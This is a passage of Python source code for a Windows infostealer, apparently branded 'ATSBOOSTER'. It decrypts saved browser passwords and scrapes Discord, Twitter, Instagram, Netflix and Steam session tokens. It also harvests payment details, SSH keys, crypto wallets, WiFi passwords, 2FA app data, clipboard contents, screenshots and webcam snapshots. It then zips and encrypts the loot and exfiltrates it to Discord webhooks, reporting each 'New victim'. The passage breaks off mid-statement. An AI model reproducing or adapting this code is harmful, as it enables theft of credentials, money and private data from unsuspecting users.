            enc_key_b64 = ls["os_crypt"]["encrypted_key"]
            enc_key = b64decode(enc_key_b64)
            if enc_key.startswith(b"DPAPI"):
                enc_key = enc_key[5:]
            elif enc_key.startswith(b"APPB"):
                enc_key = enc_key[4:]
            key = CryptUnprotectData(enc_key, None, None, None, 0)[1]
        except Exception:
            key = None
        if key is None:
            continue
        profiles = ["Default"]
        try:
            for d in os.listdir(browser_data_path):
                if d.startswith("Profile "):
                    profiles.append(d)
        except Exception:
            pass
        for profile in profiles:
            db_path = os.path.join(browser_data_path, profile, "Login Data")
            if not os.path.exists(db_path):
                db_path = os.path.join(browser_data_path, profile, "Network", "Login Data")
            if not os.path.exists(db_path):
                continue
            try:
                filename = os.path.join(dirpath, f"{browser_name}_{profile}.db")
                copyfile(db_path, filename)
                db = connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user_name, pwd in cursor.fetchall():
                    pwd_db = decrypt_data(pwd, key)
                    if pwd_db:
                        chrome_psw_list.append([user_name, pwd_db, url])
                cursor.close()
                db.close()
            except Exception:
                pass

    cleaned = []
    t_lst = []
    insta_lst = []
    n_lst = []

    for w in website:
        if w == website[0]:
            tokens = []
            token_lock = Lock()

            def discord_tokens(path):
                local_key = None
                local_state_path = os.path.join(path, "Local State")
                if not os.path.exists(local_state_path):
                    parent = os.path.dirname(path)
                    parent_ls = os.path.join(parent, "Local State")
                    if os.path.exists(parent_ls):
                        local_state_path = parent_ls
                try:
                    with open(local_state_path, "r", encoding="utf-8") as file:
                        enc_key_b64 = loads(file.read())["os_crypt"]["encrypted_key"]
                        enc_key = b64decode(enc_key_b64)
                        if enc_key.startswith(b"DPAPI"):
                            enc_key = enc_key[5:]
                        elif enc_key.startswith(b"APPB"):
                            enc_key = enc_key[4:]
                        local_key = CryptUnprotectData(enc_key, None, None, None, 0)[1]
                except Exception:
                    pass
                leveldb_dir = os.path.join(path, "Local Storage", "leveldb")
                if not os.path.exists(leveldb_dir):
                    return
                for file in os.listdir(leveldb_dir):
                    if not file.endswith(".ldb") and not file.endswith(".log"):
                        continue
                    try:
                        with open(os.path.join(leveldb_dir, file), "rb") as files:
                            content = files.read().decode("latin-1")
                            for pattern in TOKEN_PATTERNS:
                                for match in pattern.findall(content):
                                    with token_lock:
                                        if match not in tokens and match not in cleaned:
                                            tokens.append(match)
                                            cleaned.append(match)
                            for enc_match in ENCRYPTED_TOKEN_PATTERN.findall(content):
                                with token_lock:
                                    if enc_match not in tokens:
                                        tokens.append(enc_match)
                    except Exception:
                        pass
                if local_key:
                    for token in list(tokens):
                        if token.startswith("dQw4w9WgXcQ:"):
                            try:
                                enc_blob = b64decode(token.split("dQw4w9WgXcQ:")[1])
                                decrypted = decrypt_data(enc_blob, local_key)
                                if decrypted:
                                    with token_lock:
                                        if decrypted not in cleaned:
                                            cleaned.append(decrypted)
                            except Exception:
                                pass

            roaming = os.getenv("APPDATA")
            paths = [
                os.path.join(roaming, "discord"),
                os.path.join(roaming, "discordcanary"),
                os.path.join(roaming, "Lightcord"),
                os.path.join(roaming, "discordptb"),
                os.path.join(roaming, "Opera Software", "Opera Stable"),
                os.path.join(roaming, "Opera Software", "Opera GX Stable"),
                os.path.join(local, "Amigo", "User Data"),
                os.path.join(local, "Torch", "User Data"),
                os.path.join(local, "Kometa", "User Data"),
                os.path.join(local, "Orbitum", "User Data"),
                os.path.join(local, "CentBrowser", "User Data"),
                os.path.join(local, "7Star", "7Star", "User Data"),
                os.path.join(local, "Sputnik", "Sputnik", "User Data"),
                os.path.join(local, "Vivaldi", "User Data", "Default"),
                os.path.join(local, "Google", "Chrome SxS", "User Data"),
                os.path.join(local, "Google", "Chrome", "User Data", "Default"),
                os.path.join(local, "Epic Privacy Browser", "User Data"),
                os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
                os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
                os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
                os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
                os.path.join(local, "Iridium", "User Data", "Default"),
            ]
            threads = []

            def find_wb(wb):
                if os.path.exists(wb):
                    threads.append(Thread(target=discord_tokens, args=(wb,)))

            for pth in paths:
                find_wb(pth)
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        elif w == website[1]:
            t_lst = []
            for cookie in cookies_grabber_mod(w):
                if cookie["name"] == "auth_token":
                    t_lst.append(cookie["value"])
        elif w == website[2]:
            insta_lst = []
            all_cookies = cookies_grabber_mod(w)
            ds_map = {}
            sess_map = {}
            for cookie in all_cookies:
                if cookie["name"] == "ds_user_id":
                    ds_map[cookie["domain"]] = cookie["value"]
                elif cookie["name"] == "sessionid":
                    sess_map[cookie["domain"]] = cookie["value"]
            for domain in ds_map:
                if domain in sess_map:
                    insta_lst.append([ds_map[domain], sess_map[domain]])
        elif w == website[3]:
            n_lst = []
            all_cookies = cookies_grabber_mod(w)
            netflix_cookies = [c for c in all_cookies if c["name"] == "NetflixId" and len(c["value"]) > 80]
            for nc in netflix_cookies:
                entry = []
                for cookie in all_cookies:
                    if cookie["domain"] == nc["domain"]:
                        entry.append({"domain": cookie["domain"], "name": cookie["name"], "value": cookie["value"]})
                if entry not in n_lst:
                    n_lst.append(entry)

    all_data_p = []
    for x in cleaned:
        if x.startswith("dQw4w9WgXcQ:"):
            continue
        try:
            lst_b = has_payment_methods(x)
            for n in range(len(lst_b)):
                if lst_b[n]["type"] == 1:
                    writable = [lst_b[n]["brand"], lst_b[n]["type"], lst_b[n]["last_4"], lst_b[n]["expires_month"], lst_b[n]["expires_year"], lst_b[n]["billing_address"]]
                    if writable not in all_data_p:
                        all_data_p.append(writable)
                elif lst_b[n]["type"] == 2:
                    writable_2 = [lst_b[n]["email"], lst_b[n]["type"], lst_b[n]["billing_address"]]
                    if writable_2 not in all_data_p:
                        all_data_p.append(writable_2)
        except Exception:
            pass

    try:
        steam_data = grab_steam()
    except Exception:
        steam_data = {"accounts": [], "steam_path": "", "tokens": []}
    try:
        firefox_pw = grab_firefox_passwords()
    except Exception:
        firefox_pw = []
    try:
        filezilla_data = grab_filezilla()
    except Exception:
        filezilla_data = []
    try:
        winscp_data = grab_winscp()
    except Exception:
        winscp_data = []
    try:
        wifi_data = grab_wifi_passwords()
    except Exception:
        wifi_data = []
    try:
        ssh_keys = grab_ssh_keys(dirpath)
    except Exception:
        ssh_keys = []
    try:
        crypto_wallets = grab_crypto_wallets(dirpath)
    except Exception:
        crypto_wallets = []
    try:
        sensitive_files = grab_sensitive_files(dirpath)
    except Exception:
        sensitive_files = []
    try:
        telegram_path = grab_telegram(dirpath)
    except Exception:
        telegram_path = None
    try:
        gaming_data = grab_gaming_platforms(dirpath)
    except Exception:
        gaming_data = []
    try:
        vpn_data = grab_vpn_configs(dirpath)
    except Exception:
        vpn_data = []
    try:
        email_data = grab_email_clients(dirpath)
    except Exception:
        email_data = []
    try:
        twofa_data = grab_2fa_apps(dirpath)
    except Exception:
        twofa_data = []
    try:
        clipboard_data = grab_clipboard()
    except Exception:
        clipboard_data = ""
    try:
        installed_sw = grab_installed_software()
    except Exception:
        installed_sw = []
    try:
        product_keys = grab_product_keys()
    except Exception:
        product_keys = {}
    try:
        autofill_data = grab_browser_autofill(dirpath)
    except Exception:
        autofill_data = {"cards": [], "addresses": [], "phone_numbers": []}
    try:
        discord_info = grab_discord_info(cleaned)
    except Exception:
        discord_info = {"guilds": [], "friends": [], "dms": []}
    try:
        bookmarks_downloads = grab_browser_bookmarks_downloads(dirpath)
    except Exception:
        bookmarks_downloads = {"bookmarks": [], "downloads": []}
    try:
        security_tools = detect_security_tools()
    except Exception:
        security_tools = []
    try:
        screenshot_paths = grab_screenshot(dirpath)
    except Exception:
        screenshot_paths = []
    try:
        camera_path = grab_camera_snapshot(dirpath)
    except Exception:
        camera_path = None
    try:
        all_cookies = grab_all_cookies(dirpath)
    except Exception:
        all_cookies = []
    try:
        all_wifi = grab_all_wifi()
    except Exception:
        all_wifi = []
    try:
        system_info = grab_system_info()
    except Exception:
        system_info = {}
    try:
        messaging_data = grab_messaging_apps(dirpath)
    except Exception:
        messaging_data = []
    try:
        validated_tokens = validate_discord_tokens(cleaned)
    except Exception:
        validated_tokens = []

    return {
        "discord_tokens": cleaned,
        "validated_tokens": validated_tokens,
        "twitter_tokens": list(set(t_lst)),
        "instagram_tokens": list(set(tuple(element) for element in insta_lst)),
        "payment_info": all_data_p,
        "browser_passwords": chrome_psw_list,
        "netflix_cookies": n_lst,
        "steam": steam_data,
        "firefox_passwords": firefox_pw,
        "filezilla": filezilla_data,
        "winscp": winscp_data,
        "wifi": wifi_data,
        "all_wifi": all_wifi,
        "ssh_keys": ssh_keys,
        "crypto_wallets": crypto_wallets,
        "sensitive_files": sensitive_files,
        "telegram": telegram_path,
        "gaming": gaming_data,
        "vpn": vpn_data,
        "emails": email_data,
        "2fa": twofa_data,
        "clipboard": clipboard_data,
        "installed_software": installed_sw,
        "product_keys": product_keys,
        "autofill": autofill_data,
        "discord_info": discord_info,
        "bookmarks_downloads": bookmarks_downloads,
        "security_tools": security_tools,
        "screenshot_paths": screenshot_paths,
        "camera_path": camera_path,
        "all_cookies": all_cookies,
        "system_info": system_info,
        "messaging": messaging_data,
    }


# ==========================================
# ENCRYPTED PAYLOAD
# ==========================================

def encrypt_file(filepath):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        key = get_random_bytes(32)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        enc_path = filepath + ".enc"
        with open(enc_path, "wb") as f:
            f.write(cipher.nonce)
            f.write(tag)
            f.write(ciphertext)
        key_b64 = b64encode(key).decode()
        return enc_path, key_b64
    except Exception:
        return filepath, None


# ==========================================
# WEBHOOK SENDER (multi-webhook + encrypted)
# ==========================================

def send_webhook(webhook_urls):
    p_lst = get_Personal_data()
    cpu_brand = _ps_out("(Get-CimInstance Win32_Processor).Name") or "Unknown"
    cpu_maxghz = _ps_out("(Get-CimInstance Win32_Processor).MaxClockSpeed")
    try:
        cpu_ghz = round(float(cpu_maxghz) / 1000.0, 2)
    except (ValueError, TypeError):
        cpu_ghz = 0.0
    with TemporaryDirectory(dir=os.environ.get("TEMP", os.environ.get("TMP", "."))) as td:
        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        get_screenshot(path=td)
        main_info = main(td)

        discord_T = PrettyTable(padding_width=1)
        twitter_T = PrettyTable(padding_width=1)
        insta_T = PrettyTable(padding_width=1)
        chrome_Psw_t = PrettyTable(padding_width=1)
        firefox_T = PrettyTable(padding_width=1)
        wifi_T = PrettyTable(padding_width=1)
        filezilla_T = PrettyTable(padding_width=1)
        ssh_T = PrettyTable(padding_width=1)
        crypto_T = PrettyTable(padding_width=1)
        files_T = PrettyTable(padding_width=1)

        discord_T.field_names = ["Discord Tokens", "Username", "Email", "Phone"]
        twitter_T.field_names = ["Twitter Tokens [auth_token]"]
        insta_T.field_names = ["ds_user_id", "sessionid"]
        chrome_Psw_t.field_names = ["Username / Email", "password", "website"]
        firefox_T.field_names = ["URL", "Username", "Password (encrypted)"]
        wifi_T.field_names = ["SSID", "Password", "Auth"]
        filezilla_T.field_names = ["Host", "User", "Pass", "Port"]
        ssh_T.field_names = ["Key File"]
        crypto_T.field_names = ["Wallet", "Type", "Path"]
        files_T.field_names = ["File", "Path", "Size (bytes)"]

        verified_tokens = []

        for row in main_info["browser_passwords"]:
            chrome_Psw_t.add_row(row)
        for t_ in main_info["discord_tokens"]:
            if t_.startswith("dQw4w9WgXcQ:"):
                continue
            try:
                lst = get_user_data(t_)
                if lst[0] in ("Invalid Token", "Error"):
                    continue
                discord_T.add_row([t_, lst[0], lst[1], lst[2]])
                verified_tokens.append(t_)
            except BaseException:
                pass
        for _t in main_info["twitter_tokens"]:
            twitter_T.add_row([_t])
        for _t_ in main_info["instagram_tokens"]:
            insta_T.add_row(_t_)
        for fw in main_info["firefox_passwords"]:
            firefox_T.add_row([fw["url"], fw["username"], fw["password"]])
        for wf in main_info["wifi"]:
            wifi_T.add_row([wf["ssid"], wf["password"], wf["auth"]])
        for fz in main_info["filezilla"]:
            filezilla_T.add_row([fz["host"], fz["user"], fz["pass"], fz["port"]])
        for sk in main_info["ssh_keys"]:
            ssh_T.add_row([sk])
        for cw in main_info["crypto_wallets"]:
            crypto_T.add_row([cw["name"], cw["type"], cw["path"]])
        for sf in main_info["sensitive_files"][:50]:
            files_T.add_row([sf["name"], sf["path"], sf["size"]])

        pay_l = []
        for _p in main_info["payment_info"]:
            if _p[1] == 1:
                payment_card = PrettyTable(padding_width=1)
                payment_card.field_names = ["Brand", "Last 4", "Type", "Expiration", "Billing Address"]
                payment_card.add_row([_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
                pay_l.append(payment_card.get_string())
            elif _p[1] == 2:
                payment_p = PrettyTable(padding_width=1)
                payment_p.field_names = ["Email", "Type", "Billing Address"]
                payment_p.add_row([_p[0], "Paypal", _p[2]])
                pay_l.append(payment_p.get_string())

        # New tables for additional data
        gaming_T = PrettyTable(padding_width=1)
        gaming_T.field_names = ["Platform", "Path", "Type"]
        for g in main_info.get("gaming", []):
            gaming_T.add_row([g["platform"], g["path"], g["type"]])

        vpn_T = PrettyTable(padding_width=1)
        vpn_T.field_names = ["VPN", "Path"]
        for v in main_info.get("vpn", []):
            vpn_T.add_row([v["vpn"], v["path"]])

        email_T = PrettyTable(padding_width=1)
        email_T.field_names = ["Client", "Path"]
        for e in main_info.get("emails", []):
            email_T.add_row([e["client"], e["path"]])

        twofa_T = PrettyTable(padding_width=1)
        twofa_T.field_names = ["App", "Path"]
        for a in main_info.get("2fa", []):
            twofa_T.add_row([a["app"], a["path"]])

        autofill_T = PrettyTable(padding_width=1)
        autofill_T.field_names = ["Type", "Browser", "Data"]
        for card in main_info.get("autofill", {}).get("cards", []):
            autofill_T.add_row(["Card", card["browser"], f"{card['name']} exp={card['exp']}"])
        for addr in main_info.get("autofill", {}).get("addresses", []):
            autofill_T.add_row(["Address", addr["browser"], f"{addr['street']}, {addr['city']}, {addr['state']} {addr['zip']}, {addr['country']}"])
        for ph in main_info.get("autofill", {}).get("phone_numbers", []):
            autofill_T.add_row(["Phone", ph["browser"], ph["number"]])

        discord_info_T = PrettyTable(padding_width=1)
        discord_info_T.field_names = ["Type", "Name", "ID"]
        for guild in main_info.get("discord_info", {}).get("guilds", []):
            discord_info_T.add_row(["Guild", guild["name"], guild["id"]])
        for friend in main_info.get("discord_info", {}).get("friends", []):
            discord_info_T.add_row(["Friend", friend["username"], friend["id"]])

        bookmarks_T = PrettyTable(padding_width=1)
        bookmarks_T.field_names = ["Browser", "Name", "URL"]
        for bm in main_info.get("bookmarks_downloads", {}).get("bookmarks", []):
            bookmarks_T.add_row([bm["browser"], bm["name"][:40], bm["url"][:80]])

        downloads_T = PrettyTable(padding_width=1)
        downloads_T.field_names = ["Browser", "Path", "URL", "Size"]
        for dl in main_info.get("bookmarks_downloads", {}).get("downloads", []):
            downloads_T.add_row([dl["browser"], dl["path"][:40], dl["url"][:60], dl["size"]])

        files_names = [
            [os.path.join(td, "Discord Tokens.txt"), discord_T, len(main_info["discord_tokens"])],
            [os.path.join(td, "Twitter Tokens.txt"), twitter_T, len(main_info["twitter_tokens"])],
            [os.path.join(td, "Instagram Tokens.txt"), insta_T, len(main_info["instagram_tokens"])],
            [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t, len(main_info["browser_passwords"])],
            [os.path.join(td, "Firefox Pass.txt"), firefox_T, len(main_info["firefox_passwords"])],
            [os.path.join(td, "WiFi Passwords.txt"), wifi_T, len(main_info["wifi"])],
            [os.path.join(td, "FileZilla.txt"), filezilla_T, len(main_info["filezilla"])],
            [os.path.join(td, "SSH Keys.txt"), ssh_T, len(main_info["ssh_keys"])],
            [os.path.join(td, "Crypto Wallets.txt"), crypto_T, len(main_info["crypto_wallets"])],
            [os.path.join(td, "Sensitive Files.txt"), files_T, len(main_info["sensitive_files"])],
            [os.path.join(td, "Gaming.txt"), gaming_T, len(main_info.get("gaming", []))],
            [os.path.join(td, "VPN.txt"), vpn_T, len(main_info.get("vpn", []))],
            [os.path.join(td, "Emails.txt"), email_T, len(main_info.get("emails", []))],
            [os.path.join(td, "2FA.txt"), twofa_T, len(main_info.get("2fa", []))],
            [os.path.join(td, "Autofill.txt"), autofill_T, len(main_info.get("autofill", {}).get("cards", [])) + len(main_info.get("autofill", {}).get("addresses", [])) + len(main_info.get("autofill", {}).get("phone_numbers", []))],
            [os.path.join(td, "Discord Info.txt"), discord_info_T, len(main_info.get("discord_info", {}).get("guilds", [])) + len(main_info.get("discord_info", {}).get("friends", []))],
            [os.path.join(td, "Bookmarks.txt"), bookmarks_T, len(main_info.get("bookmarks_downloads", {}).get("bookmarks", []))],
            [os.path.join(td, "Downloads.txt"), downloads_T, len(main_info.get("bookmarks_downloads", {}).get("downloads", []))],
        ]
        for x_, y_, cnt in files_names:
            if cnt > 0:
                with open(x_, "w", encoding="utf-8") as wr:
                    wr.write(y_.get_string())

        payment_info_path = os.path.join(td, "Payment Info.txt")
        all_files = [os.path.join(td, "History.txt")]
        try:
            for sp in get_screenshot.scrn_paths:
                all_files.append(sp)
        except AttributeError:
            try:
                all_files.append(get_screenshot.scrn_path)
            except AttributeError:
                pass
        all_files.append(payment_info_path)

        steam_data = main_info["steam"]
        steam_path = os.path.join(td, "Steam.txt")
        if steam_data.get("accounts") or steam_data.get("tokens"):
            steam_T = PrettyTable(padding_width=1)
            steam_T.field_names = ["SteamID", "Account Name", "Persona Name"]
            for acct in steam_data.get("accounts", []):
                steam_T.add_row([acct["steamid"], acct["account_name"], acct["persona_name"]])
            with open(steam_path, "w", encoding="utf-8") as f:
                f.write(steam_T.get_string())
                if steam_data.get("tokens"):
                    f.write("\n\n--- STEAM TOKENS ---\n")
                    for tok in steam_data["tokens"]:
                        f.write(f"[{tok.get('type', 'unknown')}] {tok.get('token', '')}\n")
            all_files.append(steam_path)

        winscp_path = os.path.join(td, "WinSCP.txt")
        if main_info["winscp"]:
            with open(winscp_path, "w", encoding="utf-8") as f:
                for entry in main_info["winscp"]:
                    f.write(f"{entry['key']} = {entry['value']}\n")
            all_files.append(winscp_path)

        for idx, n in enumerate(main_info["netflix_cookies"]):
            p = os.path.join(td, f"netflix_{idx}.json")
            with open(p, "w", encoding="utf-8") as f:
                f.write(dumps(n, indent=4))
            all_files.append(p)

        with open(all_files[0], "w", encoding="utf-8") as f:
            f.write(find_His())

        # Write clipboard
        clipboard_path = os.path.join(td, "Clipboard.txt")
        if main_info.get("clipboard"):
            with open(clipboard_path, "w", encoding="utf-8") as f:
                f.write(main_info["clipboard"])
            all_files.append(clipboard_path)

        # Write installed software
        sw_path = os.path.join(td, "Installed Software.txt")
        if main_info.get("installed_software"):
            with open(sw_path, "w", encoding="utf-8") as f:
                for sw in main_info["installed_software"]:
                    f.write(f"{sw}\n")
            all_files.append(sw_path)

        # Write product keys
        pk_path = os.path.join(td, "Product Keys.txt")
        if main_info.get("product_keys"):
            with open(pk_path, "w", encoding="utf-8") as f:
                for k, v in main_info["product_keys"].items():
                    f.write(f"{k}: {v}\n")
            all_files.append(pk_path)

        # Write security tools
        sec_path = os.path.join(td, "Security Tools.txt")
        if main_info.get("security_tools"):
            with open(sec_path, "w", encoding="utf-8") as f:
                f.write("\n".join(main_info["security_tools"]))
            all_files.append(sec_path)

        # Write all cookies
        cookies_path = os.path.join(td, "All Cookies.txt")
        if main_info.get("all_cookies"):
            cookies_T = PrettyTable(padding_width=1)
            cookies_T.field_names = ["Browser", "Host", "Name", "Path"]
            for c in main_info["all_cookies"][:200]:
                cookies_T.add_row([c["browser"], c["host"][:30], c["name"][:20], c["path"][:30]])
            with open(cookies_path, "w", encoding="utf-8") as f:
                f.write(cookies_T.get_string())
            all_files.append(cookies_path)

        # Write all WiFi
        allwifi_path = os.path.join(td, "All WiFi.txt")
        if main_info.get("all_wifi"):
            allwifi_T = PrettyTable(padding_width=1)
            allwifi_T.field_names = ["SSID", "Password", "Auth", "Cipher"]
            for w in main_info["all_wifi"]:
                allwifi_T.add_row([w["ssid"], w["password"], w["auth"], w["cipher"]])
            with open(allwifi_path, "w", encoding="utf-8") as f:
                f.write(allwifi_T.get_string())
            all_files.append(allwifi_path)

        # Write system info
        sysinfo_path = os.path.join(td, "System Info.txt")
        si = main_info.get("system_info", {})
        if si:
            with open(sysinfo_path, "w", encoding="utf-8") as f:
                if si.get("gpu"):
                    f.write("=== GPU ===\n")
                    for g in si["gpu"]:
                        f.write(f"  {g}\n")
                if si.get("motherboard"):
                    mb = si["motherboard"]
                    f.write(f"\n=== Motherboard ===\n  Manufacturer: {mb.get('manufacturer','')}\n  Product: {mb.get('product','')}\n  Serial: {mb.get('serial','')}\n")
                if si.get("bios"):
                    bi = si["bios"]
                    f.write(f"\n=== BIOS ===\n  Manufacturer: {bi.get('manufacturer','')}\n  Serial: {bi.get('serial','')}\n  Version: {bi.get('version','')}\n")
                if si.get("disks"):
                    f.write("\n=== Disks ===\n")
                    for d in si["disks"]:
                        f.write(f"  {d['model']} - {d['size_gb']}GB - Serial: {d['serial']}\n")
            all_files.append(sysinfo_path)

        # Write validated tokens
        vt_path = os.path.join(td, "Validated Tokens.txt")
        if main_info.get("validated_tokens"):
            vt_T = PrettyTable(padding_width=1)
            vt_T.field_names = ["Username", "ID", "Email", "Phone", "MFA", "Nitro", "Token"]
            for v in main_info["validated_tokens"]:
                vt_T.add_row([v["username"], v["id"], v["email"], v["phone"], v["mfa"], v["nitro"], v["token"][:30]+"..."])
            with open(vt_path, "w", encoding="utf-8") as f:
                f.write(vt_T.get_string())
            all_files.append(vt_path)

        # Write messaging apps
        msg_path = os.path.join(td, "Messaging Apps.txt")
        if main_info.get("messaging"):
            msg_T = PrettyTable(padding_width=1)
            msg_T.field_names = ["App", "Path"]
            for m in main_info["messaging"]:
                msg_T.add_row([m["app"], m["path"]])
            with open(msg_path, "w", encoding="utf-8") as f:
                f.write(msg_T.get_string())
            all_files.append(msg_path)

        # Add camera snapshot to files
        if main_info.get("camera_path") and os.path.exists(main_info["camera_path"]):
            all_files.append(main_info["camera_path"])

        # Add screenshot paths
        for sp in main_info.get("screenshot_paths", []):
            if os.path.exists(sp):
                all_files.append(sp)

        # Extract and write all found emails
        try:
            found_emails = grab_emails(main_info, td)
        except Exception:
            found_emails = []
        # Also try webmail extraction via Selenium
        try:
            webmail_data = grab_webmail_emails(td)
            found_emails = sorted(set(found_emails) | set(webmail_data.get("emails", [])))
        except Exception:
            webmail_data = {"emails": [], "accounts": [], "subjects": []}
        emails_path = os.path.join(td, "Found Emails.txt")
        if found_emails:
            with open(emails_path, "w", encoding="utf-8") as f:
                for e in found_emails:
                    f.write(f"{e}\n")
            all_files.append(emails_path)
        # Write webmail accounts and subjects
        wm_path = os.path.join(td, "Webmail Data.txt")
        if webmail_data.get("accounts") or webmail_data.get("subjects"):
            with open(wm_path, "w", encoding="utf-8") as f:
                if webmail_data.get("accounts"):
                    f.write("=== LOGGED-IN ACCOUNTS ===\n")
                    for acct in webmail_data["accounts"]:
                        f.write(f"  {acct}\n")
                if webmail_data.get("subjects"):
                    f.write("\n=== RECENT EMAIL SUBJECTS ===\n")
                    for subj in webmail_data["subjects"]:
                        f.write(f"  {subj}\n")
            all_files.append(wm_path)

        # Main data zip
        zip_path = os.path.join(td, "data.zip")
        with ZipFile(zip_path, mode="w", compression=ZIP_DEFLATED) as zipf:
            if pay_l:
                with open(payment_info_path, "w", encoding="utf-8") as f:
                    for i in pay_l:
                        f.write(f"{i}\n")
            for files_path in all_files:
                try:
                    zipf.write(files_path)
                except FileNotFoundError:
                    pass
            for name_f, _, cnt in files_names:
                if cnt > 0 and os.path.exists(name_f):
                    zipf.write(name_f)
            if main_info["telegram"] and os.path.exists(main_info["telegram"]):
                for root, _, tfiles in os.walk(main_info["telegram"]):
                    for tf in tfiles:
                        try:
                            zipf.write(os.path.join(root, tf), os.path.relpath(os.path.join(root, tf), td))
                        except Exception:
                            pass
            # Add gaming/VPN/email/2fa directories
            for subdir in ["gaming", "vpn", "emails", "2fa", "messaging"]:
                sd = os.path.join(td, subdir)
                if os.path.exists(sd):
                    for root, _, sfiles in os.walk(sd):
                        for sf in sfiles:
                            try:
                                zipf.write(os.path.join(root, sf), os.path.relpath(os.path.join(root, sf), td))
                            except Exception:
                                pass

        # Sensitive files separate zip
        sensitive_zip_path = os.path.join(td, "sensitive_files.zip")
        has_sensitive = False
        with ZipFile(sensitive_zip_path, mode="w", compression=ZIP_DEFLATED) as szip:
            sf_dir = os.path.join(td, "sensitive_files")
            if os.path.exists(sf_dir):
                for root, _, sfiles in os.walk(sf_dir):
                    for sf in sfiles:
                        try:
                            szip.write(os.path.join(root, sf), os.path.relpath(os.path.join(root, sf), sf_dir))
                            has_sensitive = True
                        except Exception:
                            pass

        enc_path, enc_key = encrypt_file(zip_path)
        sensitive_enc_path, sensitive_enc_key = (encrypt_file(sensitive_zip_path) if has_sensitive else (None, None))

        _MAX_FILE = 25 * 1024 * 1024
        _enc_size = os.path.getsize(enc_path) if enc_path and os.path.exists(enc_path) else 0
        _sens_size = os.path.getsize(sensitive_enc_path) if sensitive_enc_path and os.path.exists(sensitive_enc_path) else 0
        if _enc_size > _MAX_FILE:
            zip_path2 = os.path.join(td, "data_lite.zip")
            with ZipFile(zip_path2, mode="w", compression=ZIP_DEFLATED) as zipf2:
                for name_f, _, cnt in files_names:
                    if cnt > 0 and os.path.exists(name_f):
                        try:
                            zipf2.write(name_f)
                        except Exception:
                            pass
                for files_path in all_files:
                    try:
                        if os.path.getsize(files_path) < 5*1024*1024:
                            zipf2.write(files_path)
                    except Exception:
                        pass
            enc_path, enc_key = encrypt_file(zip_path2)
        if _sens_size > _MAX_FILE:
            sensitive_enc_path = None
            sensitive_enc_key = None

        for URL in webhook_urls:
            webhook = DiscordWebhook(url=URL, username="ATSBOOSTER")
            embed = DiscordEmbed(title="New victim !", color="FFA500")
            embed.add_embed_field(
                name="SYSTEM USER INFO",
                value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n",
                inline=False,
            )
            try:
                flag_code = get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()
                flag_emoji = f":flag_{flag_code}:"
            except Exception:
                flag_emoji = ""
            try:
                mac_addr = gma() or "N/A"
            except Exception:
                mac_addr = "N/A"
            embed.add_embed_field(
                name="IP USER INFO",
                value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** {flag_emoji}\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{mac_addr}**\n:wrench:`HWID:` **{get_hwid()}**\n",
                inline=False,
            )
            embed.add_embed_field(
                name="PC USER COMPONENT",
                value=f":satellite_orbital:`CPU:` **{cpu_brand} - {cpu_ghz} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n",
                inline=False,
            )
            embed.add_embed_field(
                name="ACCOUNT GRABBED",
                value=(
                    f":red_circle:`Discord:` **{len(verified_tokens)}**\n"
                    f":purple_circle:`Twitter:` **{len(main_info['twitter_tokens'])}**\n"
                    f":blue_circle:`Instagram:` **{len(main_info['instagram_tokens'])}**\n"
                    f":green_circle:`Netflix:` **{len(main_info['netflix_cookies'])}**\n"
                    f":brown_circle:`Browser Passwords:` **{len(main_info['browser_passwords'])}**\n"
                    f":fox:`Firefox Passwords:` **{len(main_info['firefox_passwords'])}**\n"
                    f":steam:`Steam Accounts:` **{len(steam_data.get('accounts', []))}**\n"
                    f":ticket:`Steam Tokens:` **{len(steam_data.get('tokens', []))}**\n"
                    f":file_cabinet:`FileZilla:` **{len(main_info['filezilla'])}**\n"
                    f":wrench:`WinSCP:` **{len(main_info['winscp'])}**\n"
                    f":wifi:`WiFi Networks:` **{len(main_info['wifi'])}**\n"
                    f":key:`SSH Keys:` **{len(main_info['ssh_keys'])}**\n"
                    f":coin:`Crypto Wallets:` **{len(main_info['crypto_wallets'])}**\n"
                    f":file_folder:`Sensitive Files:` **{len(main_info['sensitive_files'])}**\n"
                    f":iphone:`Telegram:` **{'Yes' if main_info['telegram'] else 'No'}**\n"
                    f":video_game:`Gaming:` **{len(main_info.get('gaming', []))}**\n"
                    f":shield:`VPN:` **{len(main_info.get('vpn', []))}**\n"
                    f":email:`Emails:` **{len(main_info.get('emails', []))}**\n"
                    f":key2:`2FA Apps:` **{len(main_info.get('2fa', []))}**\n"
                    f":credit_card:`Autofill Cards:` **{len(main_info.get('autofill', {}).get('cards', []))}**\n"
                    f":discord:`Discord Guilds:` **{len(main_info.get('discord_info', {}).get('guilds', []))}**\n"
                    f":discord:`Discord Friends:` **{len(main_info.get('discord_info', {}).get('friends', []))}**\n"
                    f":bookmark:`Bookmarks:` **{len(main_info.get('bookmarks_downloads', {}).get('bookmarks', []))}**\n"
                    f":arrow_down:`Downloads:` **{len(main_info.get('bookmarks_downloads', {}).get('downloads', []))}**\n"
                    f":key:`Product Keys:` **{len(main_info.get('product_keys', {}))}**\n"
                    f":clipboard:`Clipboard:` **{'Yes' if main_info.get('clipboard') else 'No'}**\n"
                    f":wrench:`Security Tools:` **{len(main_info.get('security_tools', []))}**\n"
                    f":camera:`Camera:` **{'Yes' if main_info.get('camera_path') else 'No'}**\n"
